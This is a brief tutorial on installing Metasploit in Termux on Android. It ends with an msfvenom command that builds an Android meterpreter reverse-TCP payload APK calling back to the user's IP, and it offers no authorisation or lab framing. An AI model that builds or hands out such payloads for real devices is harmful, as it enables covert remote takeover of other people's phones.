# Metasploit



# INSTALLATION In TERMUX


# Commands
```
apt update && apt upgrade
apt install unstable-repo
apt install metasploit
```

# Single Line Command
```
apt update && apt upgrade && apt install unstable-repo && apt install metasploit
```

# For Fire up
```
msfconsole
```

# For creating payload

msfvenom -p android/meterpreter/reverse_tcp LHOST=(your IP) LPORT=4444 R> payload.apk
